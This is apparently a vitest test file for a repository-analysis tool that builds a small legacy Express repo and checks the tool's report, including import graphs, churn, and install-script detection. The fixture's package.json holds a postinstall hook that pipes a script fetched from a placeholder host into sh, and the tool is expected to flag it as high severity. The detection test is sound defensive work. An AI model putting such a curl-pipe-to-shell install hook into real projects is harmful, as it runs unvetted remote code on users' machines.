import { mkdtemp, mkdir, readdir, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { beforeAll, describe, expect, it } from 'vitest';
import { detectPackageManager, exhume, isTestFile } from '@necromancer/excavate';

/** A tiny 2014-style Express app, committed over three commits by two authors. */
async function makeRepo(): Promise<string> {
  const root = await mkdtemp(path.join(os.tmpdir(), 'necro-repo-'));
  const env = { PATH: process.env.PATH, HOME: root, GIT_CONFIG_NOSYSTEM: '1', GIT_AUTHOR_DATE: '2014-05-01T12:00:00Z', GIT_COMMITTER_DATE: '2014-05-01T12:00:00Z' };
  const git = (...args: string[]) => execFileSync('git', args, { cwd: root, env, stdio: 'pipe' });
  git('init', '-q');

  const write = async (files: Record<string, string>) => {
    for (const [rel, content] of Object.entries(files)) {
      await mkdir(path.dirname(path.join(root, rel)), { recursive: true });
      await writeFile(path.join(root, rel), content);
    }
  };
  const commit = (message: string, author: string) => {
    git('add', '.');
    git('-c', `user.name=${author}`, '-c', `user.email=${author}@example.com`, 'commit', '-q', '--no-gpg-sign', '-m', message);
  };

  await write({
    'package.json': JSON.stringify({
      name: 'old-app',
      main: 'server.js',
      engines: { node: '0.10.x' },
      dependencies: { express: '3.x', 'node-sass': '^3.4.0' },
      scripts: { postinstall: 'curl -s http://get.example.com/setup.sh | sh' },
    }),
    'server.js': "var express = require('express');\nvar routes = require('./routes');\napp.use(routes);\n",
    'routes/index.js': "var users = require('./users');\nvar db = require('../lib/db');\nmodule.exports = users;\n",
    'routes/users.js': "var db = require('../lib/db');\nvar User = require('../models/user');\n",
    'models/user.js': "var db = require('../lib/db');\nvar Util = require('../lib/Util');\n",
    'lib/db.js': "var mongo = require('mongodb');\nvar path = require('path');\n",
    'lib/util.js': 'module.exports = {};\n',
    'test/users.test.js': "var app = require('../');\nvar should = require('should');\n",
    'public/vendor/jquery.min.js': 'var x=1;',
    'node_modules/express/index.js': "require('./lib/express');",
  });
  await writeFile(path.join(root, '.gitignore'), 'node_modules\n');
  await commit('initial', 'ann');
  await writeFile(path.join(root, 'lib/db.js'), "var mongo = require('mongodb');\n// retry\n");
  await commit('fix db', 'bob');
  await writeFile(path.join(root, 'lib/db.js'), "var mongo = require('mongodb');\n// retry harder\n");
  await commit('fix db again', 'ann');
  return root;
}

let root: string;
beforeAll(async () => {
  root = await makeRepo();
});

describe('exhume', () => {
  it('produces a full report for a local repo', async () => {
    const report = await exhume(root, { top: 3 });

    expect(report.repo).toMatchObject({ source: root, packageManager: 'npm' });
    expect(report.repo.commit).toMatch(/^[0-9a-f]{40}$/);
    expect(report.stats).toMatchObject({
      files: 7, // node_modules and *.min.js skipped
      unresolvedImports: 0,
      caseMismatchedImports: 1,
      testFiles: 1,
      filesWithParseErrors: 0,
    });
    expect(report.history).toMatchObject({ commits: 3, authors: 2 });

    expect(report.loadBearing[0]).toMatchObject({ path: 'lib/db.js', fanIn: 3, churn: 3 });
    expect(report.loadBearing).toHaveLength(3);
    expect(report.loadBearing.map((f) => f.path)).not.toContain('test/users.test.js');

    expect(report.clusters.flatMap((c) => c.files).sort()).toEqual([
      'lib/db.js',
      'lib/util.js',
      'models/user.js',
      'routes/index.js',
      'routes/users.js',
      'server.js',
    ]);
    expect(report.caseMismatches).toEqual([
      { from: 'models/user.js', specifier: '../lib/Util', line: 2, target: 'lib/util.js' },
    ]);
    expect(report.externalPackages).toEqual([
      { name: 'express', importedBy: 1, importers: ['server.js'] },
      { name: 'mongodb', importedBy: 1, importers: ['lib/db.js'] },
      { name: 'should', importedBy: 1, importers: ['test/users.test.js'] },
    ]);
    expect(report.manifests[0]).toMatchObject({ name: 'old-app', engines: { node: '0.10.x' }, scripts: { postinstall: expect.any(String) } });
    expect(report.graph.edges).toContainEqual(['routes/users.js', 'lib/db.js']);
    expect(report.graph.nodes.find((n) => n.id === 'test/users.test.js')).toMatchObject({ isTest: true, cluster: -1, score: null });
    expect(report.graph.nodes.find((n) => n.id === 'lib/db.js')).toMatchObject({ fanIn: 3, churn: 3, blastRadius: 4 });
    expect(report.installScripts).toEqual([
      expect.objectContaining({ packageName: 'old-app', hook: 'postinstall', severity: 'high' }),
    ]);
  });

  it('clones a git URL and cleans up afterwards', async () => {
    const workdir = await mkdtemp(path.join(os.tmpdir(), 'necro-work-'));
    const report = await exhume(`file://${root}`, { workdir, top: 1 });
    expect(report.history.commits).toBe(3);
    expect(report.loadBearing[0]?.path).toBe('lib/db.js');
    expect(await readdir(workdir)).toEqual([]);
  });

  it('produces the same report twice', async () => {
    const a = await exhume(root);
    const b = await exhume(root);
    a.stats.durationMs = b.stats.durationMs = 0;
    expect(a).toEqual(b);
  });
});

describe('helpers', () => {
  it('detects test files', () => {
    expect(isTestFile('test/a.js')).toBe(true);
    expect(isTestFile('src/__tests__/a.ts')).toBe(true);
    expect(isTestFile('src/a.spec.tsx')).toBe(true);
    expect(isTestFile('src/latest.js')).toBe(false);
    expect(isTestFile('src/contest/a.js')).toBe(false);
  });

  it('detects the package manager from lockfiles', () => {
    expect(detectPackageManager(['package.json', 'yarn.lock'])).toBe('yarn');
    expect(detectPackageManager(['package.json', 'pnpm-lock.yaml'])).toBe('pnpm');
    expect(detectPackageManager(['bower.json'])).toBe('bower');
    expect(detectPackageManager(['README'])).toBe('unknown');
  });
});
